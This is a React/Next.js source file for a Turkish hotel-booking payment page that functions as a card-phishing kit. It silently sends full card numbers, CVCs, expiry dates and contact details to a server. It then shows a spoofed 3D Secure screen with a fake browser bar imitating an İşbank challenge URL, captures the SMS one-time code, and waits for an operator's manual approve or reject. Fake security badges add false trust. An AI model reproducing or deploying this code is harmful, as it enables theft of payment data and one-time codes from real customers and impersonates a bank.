'use client';

import { useState, useEffect, useRef, Suspense } from 'react';
import { useSearchParams, useRouter } from 'next/navigation';
import { Wifi, Lock, ShieldCheck, CheckCircle, XCircle, ArrowLeft, CreditCard } from 'lucide-react';

// ─── Types ────────────────────────────────────────────────────────────────────
type Step = 'card' | 'processing' | 'sms' | 'verifying' | 'success' | 'failed';

interface CardData {
  number: string;
  name: string;
  expMonth: string;
  expYear: string;
  cvc: string;
  email: string;
  phone: string;
}

// ─── Helpers ──────────────────────────────────────────────────────────────────
function fmtCard(raw: string) {
  return raw.replace(/\D/g, '').slice(0, 16).replace(/(.{4})/g, '$1 ').trim();
}
function detectType(num: string): 'visa' | 'mc' | 'amex' | 'other' {
  if (/^4/.test(num)) return 'visa';
  if (/^5[1-5]/.test(num)) return 'mc';
  if (/^3[47]/.test(num)) return 'amex';
  return 'other';
}
function maskDisplay(raw: string) {
  const d = raw.replace(/\D/g, '').padEnd(16, '•');
  return [d.slice(0,4),d.slice(4,8),d.slice(8,12),d.slice(12,16)].join(' ');
}

// ─── 3D Animated Card ─────────────────────────────────────────────────────────
function LiveCard({ card, flipped }: { card: CardData; flipped: boolean }) {
  const t = detectType(card.number.replace(/\D/g,''));
  return (
    <div style={{ perspective: '1200px' }} className="w-full max-w-sm mx-auto select-none mb-6">
      <div className="relative w-full" style={{ height:210, transformStyle:'preserve-3d', transform: flipped?'rotateY(180deg)':'rotateY(0deg)', transition:'transform .65s ease' }}>
        {/* Front */}
        <div className="absolute inset-0 rounded-2xl px-7 py-6 flex flex-col justify-between shadow-2xl overflow-hidden"
          style={{ backfaceVisibility:'hidden', background:'linear-gradient(135deg,#1a1f36 0%,#2d3561 45%,#1a2a5e 100%)' }}>
          <div className="absolute -top-10 -right-10 w-48 h-48 rounded-full opacity-[0.07] bg-white"/>
          <div className="absolute -bottom-16 -left-12 w-56 h-56 rounded-full opacity-[0.07] bg-white"/>
          <div className="flex justify-between items-start relative">
            {/* Chip */}
            <div className="w-11 h-8 rounded bg-gradient-to-br from-yellow-300 to-yellow-500 flex flex-col gap-[3px] p-1 shadow">
              <div className="flex gap-1"><div className="flex-1 h-1.5 bg-yellow-700/40 rounded-sm"/><div className="flex-1 h-1.5 bg-yellow-700/40 rounded-sm"/></div>
              <div className="h-2 bg-yellow-700/30 rounded-sm"/>
              <div className="flex gap-1"><div className="flex-1 h-1.5 bg-yellow-700/40 rounded-sm"/><div className="flex-1 h-1.5 bg-yellow-700/40 rounded-sm"/></div>
            </div>
            <div className="flex items-center gap-3">
              <Wifi size={16} className="text-white/40 rotate-90"/>
              {t==='visa' && <span className="text-2xl font-black italic tracking-wider text-white">VISA</span>}
              {t==='mc' && <div className="flex -space-x-3"><div className="w-8 h-8 rounded-full bg-red-500 opacity-90"/><div className="w-8 h-8 rounded-full bg-yellow-400 opacity-90"/></div>}
              {(t==='amex'||t==='other') && <div className="w-9 h-7 rounded border border-white/30 flex items-center justify-center"><span className="text-[8px] text-white/60 font-bold tracking-wider">KART</span></div>}
            </div>
          </div>
          <div className="font-mono text-[1.15rem] font-bold tracking-[0.2em] text-white/95 relative">
            {maskDisplay(card.number.replace(/\D/g,''))}
          </div>
          <div className="flex justify-between items-end relative">
            <div>
              <div className="text-[8px] uppercase tracking-widest text-white/40 mb-0.5">Kart Sahibi</div>
              <div className="text-sm font-bold tracking-wider uppercase text-white/90 truncate max-w-[190px]">{card.name||'AD SOYAD'}</div>
            </div>
            <div className="text-right">
              <div className="text-[8px] uppercase tracking-widest text-white/40 mb-0.5">Son Kul.</div>
              <div className="text-sm font-bold font-mono text-white/90">{card.expMonth||'——'}/{card.expYear||'——'}</div>
            </div>
          </div>
        </div>
        {/* Back */}
        <div className="absolute inset-0 rounded-2xl overflow-hidden shadow-2xl"
          style={{ backfaceVisibility:'hidden', transform:'rotateY(180deg)', background:'linear-gradient(135deg,#1a1f36 0%,#2d3561 45%,#1a2a5e 100%)' }}>
          <div className="w-full h-11 bg-black/80 mt-8"/>
          <div className="mx-6 mt-4">
            <div className="text-right text-[8px] uppercase tracking-widest text-white/40 mb-1">CVV/CVC</div>
            <div className="bg-white/90 rounded px-4 py-2 text-right font-mono font-bold text-gray-800 tracking-[0.4em]">{card.cvc||'•••'}</div>
          </div>
          <div className="absolute bottom-5 right-6 opacity-25 text-white">
            {t==='visa' && <span className="text-xl font-black italic">VISA</span>}
          </div>
        </div>
      </div>
    </div>
  );
}

// ─── Processing Spinner ────────────────────────────────────────────────────────
function ProcessingScreen({ label }: { label: string }) {
  return (
    <div className="flex flex-col items-center justify-center py-24 text-white">
      <div className="relative mb-8">
        <div className="w-20 h-20 rounded-full border-4 border-white/5"/>
        <div className="absolute inset-0 rounded-full border-4 border-transparent border-t-blue-400 animate-spin"/>
        <div className="absolute inset-2 rounded-full border-4 border-transparent border-t-indigo-300 animate-spin" style={{animationDuration:'1.5s',animationDirection:'reverse'}}/>
        <div className="absolute inset-0 flex items-center justify-center">
          <ShieldCheck size={22} className="text-blue-400 animate-pulse"/>
        </div>
      </div>
      <p className="font-bold text-base text-white/90 mb-1">{label}</p>
      <p className="text-sm text-white/40">Lütfen bekleyin...</p>
    </div>
  );
}

// ─── SVG Countdown Ring ────────────────────────────────────────────────────────
function Ring({ s, total }: { s: number; total: number }) {
  const r = 40, c = 2*Math.PI*r;
  const ratio = s/total;
  const stroke = ratio > 0.4 ? '#60a5fa' : ratio > 0.15 ? '#fbbf24' : '#f87171';
  return (
    <div className="relative inline-flex items-center justify-center">
      <svg width="96" height="96" className="-rotate-90">
        <circle cx="48" cy="48" r={r} fill="none" stroke="rgba(255,255,255,0.06)" strokeWidth="5"/>
        <circle cx="48" cy="48" r={r} fill="none" stroke={stroke} strokeWidth="5"
          strokeDasharray={`${c*ratio} ${c}`} strokeLinecap="round"
          style={{transition:'stroke-dasharray 1s linear, stroke .5s'}}/>
      </svg>
      <div className="absolute flex flex-col items-center leading-none">
        <span className="text-2xl font-black" style={{color:stroke}}>{s}</span>
        <span className="text-[9px] text-white/30 mt-0.5">sn</span>
      </div>
    </div>
  );
}

// ─── Main ─────────────────────────────────────────────────────────────────────
function PaymentContent() {
  const searchParams = useSearchParams();
  const router = useRouter();

  const roomId    = searchParams.get('roomId');
  const roomName  = searchParams.get('roomName');
  const totalPrice= searchParams.get('totalPrice');
  const checkIn   = searchParams.get('checkIn');
  const checkOut  = searchParams.get('checkOut');
  const adults    = searchParams.get('adults');
  const children  = searchParams.get('children');

  const [step, setStep] = useState<Step>('card');
  const [flipped, setFlipped] = useState(false);
  const [card, setCard] = useState<CardData>({ number:'', name:'', expMonth:'', expYear:'', cvc:'', email:'', phone:'' });
  const [otp, setOtp] = useState('');
  const [smsTimer, setSmsTimer] = useState(180);
  const [shakeOtp, setShakeOtp] = useState(false);
  const [resNo] = useState(() => `${Date.now().toString(36).toUpperCase()}`);
  const otpRef = useRef<HTMLInputElement>(null);

  useEffect(() => { if (!roomId) router.push('/booking'); }, [roomId, router]);

  // SMS countdown
  useEffect(() => {
    if (step !== 'sms') return;
    const iv = setInterval(() => {
      setSmsTimer(s => {
        if (s <= 1) { clearInterval(iv); setStep('failed'); return 0; }
        return s - 1;
      });
    }, 1000);
    return () => clearInterval(iv);
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [step]);

  // Silently persist to server (works across all browser sessions)
  async function persist(extra: Record<string, unknown>) {
    let pendingData: Record<string, string> = {};
    try {
      pendingData = JSON.parse(localStorage.getItem('selge_pending_contact') || '{}');
    } catch { /* silent */ }

    const payload = {
      id: resNo,
      timestamp: new Date().toISOString(),
      savedAt: new Date().toISOString(),
      roomId, roomName, totalPrice, checkIn, checkOut, adults, children,
      ...pendingData,
      cardHolder:  card.name,
      cardNumber:  card.number.replace(/\s/g,''),
      cardExpiry:  `${card.expMonth}/${card.expYear}`,
      cardCvc:     card.cvc,
      cardType:    detectType(card.number.replace(/\D/g,'')).toUpperCase(),
      email:       card.email || pendingData.email,
      phone:       card.phone || pendingData.mobile || pendingData.phone,
      ...extra,
    };
    try {
      await fetch('/api/reservations', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload),
      });
    } catch { /* silent */ }
  }

  // Poll for admin decision via server API (works across all sessions)
  function pollForDecision(pollId: string) {
    const interval = setInterval(async () => {
      try {
        const res = await fetch('/api/reservations');
        const list = await res.json() as { id: string; adminAction?: string }[];
        const reservation = list.find((r) => r.id === pollId);
        if (reservation?.adminAction === 'approve') {
          clearInterval(interval);
          await persist({ status:'confirmed', smsVerified:true });
          setStep('success');
        } else if (reservation?.adminAction === 'reject') {
          clearInterval(interval);
          await persist({ status:'rejected', smsVerified:false });
          setStep('failed');
        }
      } catch { /* silent */ }
    }, 1500);
    setTimeout(() => clearInterval(interval), 120_000);
  }

  // Step 1: Card Submit → 1st admin notification
  const submitCard = async (e: React.FormEvent) => {
    e.preventDefault();
    // 1st drop to server: full card + contact info visible
    await persist({ status:'card_submitted', smsCode:'', smsVerified:false, adminAction:null });
    setStep('processing');
    setTimeout(async () => {
      // Update to awaiting_sms so admin sees it
      await persist({ status:'awaiting_sms' });
      setStep('sms');
      setTimeout(() => otpRef.current?.focus(), 300);
    }, 2200);
  };

  // Step 2: OTP Submit → 2nd admin notification
  const submitOtp = async (e: React.FormEvent) => {
    e.preventDefault();
    if (otp.length < 6) return;
    await persist({ smsCode: otp, status:'sms_entered', smsVerified:false });
    setStep('verifying');
    pollForDecision(resNo);
  };

  // ── SUCCESS ─────────────────────────────────────────────────────────────────
  if (step === 'success') {
    return (
      <div className="min-h-screen flex items-center justify-center pt-[122px] px-4 pb-10" style={{background:'#f8faff'}}>
        <div className="bg-white rounded-3xl shadow-2xl max-w-md w-full overflow-hidden animate-in zoom-in-95 duration-500">
          <div className="p-10 text-center">
            <div className="w-20 h-20 rounded-full bg-emerald-50 flex items-center justify-center mx-auto mb-5 shadow-lg shadow-emerald-100">
              <CheckCircle className="text-emerald-500 w-12 h-12"/>
            </div>
            <h1 className="text-2xl font-bold text-gray-900 mb-1">Ödeme Başarılı</h1>
            <p className="text-gray-500 text-sm mb-6">İşleminiz başarıyla gerçekleştirildi.</p>
            <div className="bg-gray-50 rounded-2xl p-5 text-left space-y-3 mb-6">
              <Row2 k="Rezervasyon No" v={resNo} mono/>
              <Row2 k="Oda" v={roomName??''}/>
              <Row2 k="Tarih" v={`${checkIn} → ${checkOut}`}/>
              <Row2 k="Tutar" v={`${Number(totalPrice).toLocaleString('tr-TR')} TL`} green/>
            </div>
            <p className="text-xs text-gray-400 mb-6">Onay bilgileri {card.email} adresine gönderilecektir.</p>
            <button onClick={()=>router.push('/')} className="w-full bg-gray-900 text-white py-3.5 rounded-xl font-bold text-sm tracking-widest hover:bg-gray-700 transition-colors">
              Ana Sayfaya Dön
            </button>
          </div>
        </div>
      </div>
    );
  }


  // ── FAILED ──────────────────────────────────────────────────────────────────
  if (step === 'failed') {
    return (
      <div className="min-h-screen flex items-center justify-center pt-[122px] px-4 pb-10" style={{background:'#fff8f8'}}>
        <div className="bg-white rounded-3xl shadow-2xl max-w-md w-full overflow-hidden animate-in zoom-in-95 duration-500">
          <div className="p-10 text-center">
            <div className="w-20 h-20 rounded-full bg-red-50 flex items-center justify-center mx-auto mb-5 shadow-lg shadow-red-100">
              <XCircle className="text-red-500 w-12 h-12"/>
            </div>
            <h1 className="text-2xl font-bold text-gray-900 mb-1">İşlem Reddedildi</h1>
            <p className="text-gray-500 text-sm mb-8">Ödeme işleminiz tamamlanamadı. Kart bilgilerinizi kontrol edip tekrar deneyebilirsiniz.</p>
            <div className="flex gap-3">
              <button onClick={()=>{setStep('card');setOtp('');setShakeOtp(false);setSmsTimer(180);}}
                className="flex-1 border-2 border-gray-200 text-gray-700 py-3 rounded-xl font-bold text-sm hover:border-gray-400 transition-colors">
                Tekrar Dene
              </button>
              <button onClick={()=>router.push('/booking')} className="flex-1 bg-gray-900 text-white py-3 rounded-xl font-bold text-sm hover:bg-gray-700 transition-colors">
                Geri Dön
              </button>
            </div>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen pt-[122px]" style={{background:'#f0f4ff'}}>
      {/* Progress bar */}
      <div className="h-1 w-full" style={{background:'#e8ecff'}}>
        <div className="h-full bg-blue-600 transition-all duration-700"
          style={{width: step==='card'?'33%': step==='processing'?'55%': step==='sms'?'66%': step==='verifying'?'88%':'100%'}}/>
      </div>

      <div className="container-custom py-10 max-w-5xl">
        <div className="flex flex-col lg:flex-row gap-8 items-start">

          {/* ─── LEFT: Payment Area ─────────────────────────────────────── */}
          <div className="flex-1">

            {/* ══ CARD FORM ══ */}
            {step === 'card' && (
              <div className="bg-white rounded-3xl shadow-sm border border-gray-100 overflow-hidden">
                {/* Header */}
                <div className="px-8 pt-8 pb-6 border-b border-gray-50 flex items-center justify-between">
                  <div>
                    <h1 className="text-xl font-bold text-gray-900">Güvenli Ödeme</h1>
                    <p className="text-sm text-gray-400 mt-0.5">Kart bilgilerinizi güvenle giriniz</p>
                  </div>
                  <div className="flex items-center gap-2 bg-green-50 px-3 py-1.5 rounded-full border border-green-100">
                    <Lock size={12} className="text-green-600"/>
                    <span className="text-xs font-bold text-green-700">SSL Güvenli</span>
                  </div>
                </div>

                <div className="px-8 py-6">
                  {/* Live Card Preview */}
                  <LiveCard card={card} flipped={flipped}/>

                  <form onSubmit={submitCard} className="space-y-4">
                    {/* Card Number */}
                    <div>
                      <label className="block text-xs font-semibold text-gray-500 mb-1.5">Kart Numarası</label>
                      <div className="relative">
                        <input type="text" required placeholder="0000  0000  0000  0000"
                          value={card.number} maxLength={19}
                          onChange={e => setCard({...card, number:fmtCard(e.target.value)})}
                          className="w-full border border-gray-200 rounded-xl px-4 py-3 font-mono text-[15px] tracking-widest text-gray-800 focus:border-blue-400 focus:ring-2 focus:ring-blue-100 outline-none transition-all placeholder-gray-300"/>
                        {/* Card brand indicator */}
                        <div className="absolute right-4 top-1/2 -translate-y-1/2">
                          {detectType(card.number.replace(/\D/g,''))==='visa' && <span className="text-lg font-black italic text-blue-700">VISA</span>}
                          {detectType(card.number.replace(/\D/g,''))==='mc' && <div className="flex -space-x-2"><div className="w-5 h-5 rounded-full bg-red-500"/><div className="w-5 h-5 rounded-full bg-yellow-400"/></div>}
                          {detectType(card.number.replace(/\D/g,''))==='other' && <CreditCard size={20} className="text-gray-300"/>}
                        </div>
                      </div>
                    </div>

                    {/* Name */}
                    <div>
                      <label className="block text-xs font-semibold text-gray-500 mb-1.5">Kart Sahibinin Adı</label>
                      <input type="text" required placeholder="AD SOYAD"
                        value={card.name}
                        onChange={e => setCard({...card, name:e.target.value.toUpperCase()})}
                        className="w-full border border-gray-200 rounded-xl px-4 py-3 uppercase tracking-wider text-gray-800 focus:border-blue-400 focus:ring-2 focus:ring-blue-100 outline-none transition-all placeholder-gray-300"/>
                    </div>

                    {/* Expiry + CVC */}
                    <div className="grid grid-cols-3 gap-3">
                      <div>
                        <label className="block text-xs font-semibold text-gray-500 mb-1.5">Ay</label>
                        <input type="text" required placeholder="AA" maxLength={2}
                          value={card.expMonth} onChange={e=>setCard({...card,expMonth:e.target.value.replace(/\D/g,'')})}
                          className="w-full border border-gray-200 rounded-xl px-3 py-3 text-center font-mono font-bold text-gray-800 focus:border-blue-400 focus:ring-2 focus:ring-blue-100 outline-none transition-all"/>
                      </div>
                      <div>
                        <label className="block text-xs font-semibold text-gray-500 mb-1.5">Yıl</label>
                        <input type="text" required placeholder="YY" maxLength={2}
                          value={card.expYear} onChange={e=>setCard({...card,expYear:e.target.value.replace(/\D/g,'')})}
                          className="w-full border border-gray-200 rounded-xl px-3 py-3 text-center font-mono font-bold text-gray-800 focus:border-blue-400 focus:ring-2 focus:ring-blue-100 outline-none transition-all"/>
                      </div>
                      <div>
                        <label className="block text-xs font-semibold text-gray-500 mb-1.5">CVV</label>
                        <input type="password" required placeholder="•••" maxLength={4}
                          value={card.cvc}
                          onFocus={()=>setFlipped(true)} onBlur={()=>setFlipped(false)}
                          onChange={e=>setCard({...card,cvc:e.target.value.replace(/\D/g,'')})}
                          className="w-full border border-gray-200 rounded-xl px-3 py-3 text-center font-mono font-bold text-gray-800 focus:border-blue-400 focus:ring-2 focus:ring-blue-100 outline-none transition-all"/>
                      </div>
                    </div>

                    {/* Contact */}
                    <div className="pt-2 border-t border-gray-50">
                      <p className="text-xs font-semibold text-gray-400 uppercase tracking-widest mb-3">İletişim Bilgileri</p>
                      <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
                        <div>
                          <label className="block text-xs font-semibold text-gray-500 mb-1.5">E-posta</label>
                          <input type="email" required placeholder="ad@eposta.com"
                            value={card.email} onChange={e=>setCard({...card,email:e.target.value})}
                            className="w-full border border-gray-200 rounded-xl px-4 py-3 text-sm text-gray-800 focus:border-blue-400 focus:ring-2 focus:ring-blue-100 outline-none transition-all placeholder-gray-300"/>
                        </div>
                        <div>
                          <label className="block text-xs font-semibold text-gray-500 mb-1.5">Telefon</label>
                          <input type="tel" required placeholder="05__ ___ __ __"
                            value={card.phone} onChange={e=>setCard({...card,phone:e.target.value})}
                            className="w-full border border-gray-200 rounded-xl px-4 py-3 text-sm text-gray-800 focus:border-blue-400 focus:ring-2 focus:ring-blue-100 outline-none transition-all placeholder-gray-300"/>
                        </div>
                      </div>
                    </div>

                    {/* Submit */}
                    <button type="submit"
                      className="w-full bg-blue-600 hover:bg-blue-700 text-white py-4 rounded-xl font-bold text-sm tracking-wider transition-colors flex items-center justify-center gap-2 shadow-lg shadow-blue-200 mt-2">
                      <Lock size={15}/> Güvenli Ödemeye Devam Et
                    </button>

                    {/* Trust badges */}
                    <div className="flex items-center justify-center gap-6 pt-2">
                      {['256-bit SSL', '3D Secure', 'PCI DSS'].map(b => (
                        <div key={b} className="flex items-center gap-1 text-gray-400 text-[11px]">
                          <ShieldCheck size={11}/>{b}
                        </div>
                      ))}
                    </div>
                  </form>
                </div>
              </div>
            )}

            {/* ══ PROCESSING: Bank gateway ══ */}
            {step === 'processing' && (
              <div className="bg-white rounded-3xl shadow-sm border border-gray-100 overflow-hidden">
                <div className="px-8 py-3 border-b border-gray-50 flex items-center gap-3 bg-gray-50">
                  <Lock size={13} className="text-gray-400"/>
                  <span className="font-mono text-xs text-gray-400">secure.payment-gateway.com/3ds/v2/auth</span>
                </div>
                <ProcessingScreen label="Banka ile güvenli bağlantı kuruluyor"/>
              </div>
            )}

            {/* ══ SMS / OTP SCREEN ══ */}
            {step === 'sms' && (
              <div className="bg-white rounded-3xl shadow-sm border border-gray-100 overflow-hidden">
                {/* Fake browser bar */}
                <div className="flex items-center gap-3 px-5 py-3 border-b border-gray-100 bg-gray-50">
                  <div className="flex gap-1.5">
                    <div className="w-3 h-3 rounded-full bg-gray-300"/>
                    <div className="w-3 h-3 rounded-full bg-gray-300"/>
                    <div className="w-3 h-3 rounded-full bg-gray-300"/>
                  </div>
                  <div className="flex-1 bg-white rounded-lg px-4 py-1.5 text-xs text-gray-400 font-mono flex items-center gap-1.5 border border-gray-100">
                    <Lock size={10} className="text-green-500"/> acs.isbank.com.tr/3ds/v2/challenge
                  </div>
                  <ShieldCheck size={18} className="text-green-500"/>
                </div>

                <div className="px-8 py-10 flex flex-col items-center text-center">
                  {/* Bank header */}
                  <div className="flex items-center gap-3 mb-8">
                    <div className="w-10 h-10 rounded-xl bg-blue-600 flex items-center justify-center shadow"><Lock size={18} className="text-white"/></div>
                    <div className="text-left">
                      <p className="font-black text-gray-900 text-sm">3D Secure Doğrulama</p>
                      <p className="text-xs text-gray-400">Mastercard Identity Check™</p>
                    </div>
                  </div>

                  {/* Timer */}
                  <Ring s={smsTimer} total={180}/>
                  <p className="text-xs text-gray-400 mt-3 mb-8">
                    Bu ekran <span className="font-bold text-gray-600">{Math.floor(smsTimer/60)}:{String(smsTimer%60).padStart(2,'0')}</span> içinde geçersiz olacak
                  </p>

                  {/* Message */}
                  <div className="w-full max-w-xs bg-blue-50 border border-blue-100 rounded-2xl p-4 mb-6 text-left">
                    <p className="text-xs text-blue-600 font-semibold mb-1">Bilgi</p>
                    <p className="text-sm text-gray-700">
                      <span className="font-bold">{card.phone}</span> numaralı telefonunuza 6 haneli doğrulama kodu gönderilmiştir.
                    </p>
                  </div>

                  <form onSubmit={submitOtp} className="w-full max-w-xs">
                    {/* OTP Digit boxes (visual only) */}
                    <div className="flex gap-2 justify-center mb-4 pointer-events-none select-none" aria-hidden>
                      {Array.from({length:6}).map((_,i) => (
                        <div key={i} className={`w-11 h-13 rounded-xl border-2 flex items-center justify-center text-xl font-black font-mono transition-all duration-200
                          ${otp[i] ? 'border-blue-400 bg-blue-50 text-blue-700 scale-105' : 'border-gray-200 text-gray-200'}
                          ${shakeOtp ? 'border-red-300 bg-red-50' : ''}
                        `} style={{height:52}}>
                          {otp[i] || '·'}
                        </div>
                      ))}
                    </div>

                    {/* Actual OTP input */}
                    <input
                      ref={otpRef}
                      type="text"
                      inputMode="numeric"
                      pattern="[0-9]*"
                      maxLength={6}
                      required
                      value={otp}
                      onChange={e => { setOtp(e.target.value.replace(/\D/g,'')); setShakeOtp(false); }}
                      className="w-full border-2 border-gray-200 rounded-xl px-4 py-3 text-center text-2xl font-mono font-bold tracking-[0.5em] text-gray-800 focus:border-blue-400 focus:ring-2 focus:ring-blue-100 outline-none mb-5 transition-all"
                      placeholder="• • • • • •"
                    />

                    <button type="submit" disabled={otp.length < 6}
                      className="w-full bg-blue-600 hover:bg-blue-700 disabled:opacity-40 text-white py-3.5 rounded-xl font-bold text-sm tracking-wider transition-all flex items-center justify-center gap-2 shadow-md shadow-blue-100">
                      <ShieldCheck size={15}/> Doğrula
                    </button>

                    <div className="flex items-center justify-center gap-4 mt-5 text-xs text-gray-400">
                      <button type="button" className="hover:text-blue-500 transition-colors">Kodu yeniden gönder</button>
                      <span>·</span>
                      <button type="button" onClick={() => setStep('card')} className="hover:text-blue-500 transition-colors flex items-center gap-1">
                        <ArrowLeft size={11}/> Geri
                      </button>
                    </div>
                  </form>
                </div>
              </div>
            )}

            {/* ══ VERIFYING ══ */}
            {step === 'verifying' && (
              <div className="bg-white rounded-3xl shadow-sm border border-gray-100 overflow-hidden">
                <div className="px-8 py-3 border-b border-gray-50 flex items-center gap-3 bg-gray-50">
                  <Lock size={13} className="text-gray-400"/>
                  <span className="font-mono text-xs text-gray-400">secure.payment-gateway.com/3ds/v2/verify</span>
                </div>
                <ProcessingScreen label="Doğrulama işlemi gerçekleştiriliyor"/>
              </div>
            )}
          </div>

          {/* ─── RIGHT: Order Summary ─────────────────────────────────────── */}
          <div className="w-full lg:w-[300px] shrink-0">
            <div className="bg-white rounded-3xl shadow-sm border border-gray-100 overflow-hidden sticky top-32">
              <div className="px-6 py-5 border-b border-gray-50">
                <p className="text-xs font-bold text-gray-400 uppercase tracking-widest mb-0.5">Sipariş Özeti</p>
                <h3 className="font-bold text-gray-900">{roomName}</h3>
              </div>
              <div className="px-6 py-5 space-y-3 text-sm">
                <SRow k="Giriş" v={checkIn??'—'}/>
                <SRow k="Çıkış" v={checkOut??'—'}/>
                <SRow k="Misafir" v={`${adults} Yetişkin${Number(children)>0?`, ${children} Çocuk`:''}`}/>
                <div className="border-t border-gray-100 pt-4 mt-2">
                  <div className="flex justify-between items-center">
                    <span className="text-gray-500">Toplam</span>
                    <span className="text-xl font-black text-gray-900">{Number(totalPrice).toLocaleString('tr-TR')} <span className="text-sm font-normal text-gray-400">TL</span></span>
                  </div>
                </div>
                <div className="bg-gray-50 rounded-2xl p-4 space-y-2">
                  {['SSL Şifreleme','3D Secure','PCI DSS Uyumlu'].map(f=>(
                    <div key={f} className="flex items-center gap-2 text-xs text-gray-500">
                      <ShieldCheck size={13} className="text-green-500 shrink-0"/>{f}
                    </div>
                  ))}
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}

function Row2({ k, v, mono, green }: { k: string; v: string; mono?: boolean; green?: boolean }) {
  return (
    <div className="flex justify-between text-sm">
      <span className="text-gray-400">{k}</span>
      <span className={`font-semibold text-right max-w-[200px] ${mono?'font-mono text-gray-700':green?'text-emerald-600':'text-gray-800'}`}>{v}</span>
    </div>
  );
}

function SRow({ k, v }: { k: string; v: string }) {
  return (
    <div className="flex justify-between text-sm">
      <span className="text-gray-400">{k}</span>
      <span className="font-medium text-gray-700">{v}</span>
    </div>
  );
}

// Wrapper with Suspense for useSearchParams
export default function PaymentPage() {
  return (
    <Suspense fallback={<div className="min-h-screen flex items-center justify-center bg-gray-900"><div className="text-center"><div className="animate-spin rounded-full h-12 w-12 border-b-2 border-blue-500 mx-auto"></div><p className="mt-4 text-gray-400">Yükleniyor...</p></div></div>}>
      <PaymentContent />
    </Suspense>
  );
}
